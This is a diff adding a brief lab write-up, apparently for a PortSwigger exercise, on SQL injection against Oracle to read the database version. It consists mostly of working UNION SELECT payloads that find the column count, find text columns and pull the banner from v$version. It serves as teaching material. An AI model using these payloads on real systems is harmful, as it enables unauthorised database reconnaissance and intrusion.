@@ -1,0 +1,18 @@
+SQL injection attack, querying the database type and version on Oracle
+
+Given the hints provided, we start with getting the number of columns:
+
+'+UNION+SELECT+NULL,NULL+FROM+DUAL--
+
+Now finding the columns with text:
+
+'+UNION+SELECT+'asdf','asdf'+FROM+DUAL--
+
+Using the cheatsheet provided at 
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+Oracle 	SELECT banner FROM v$version
+SELECT version FROM v$instance
+
+We can now get the database version:
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
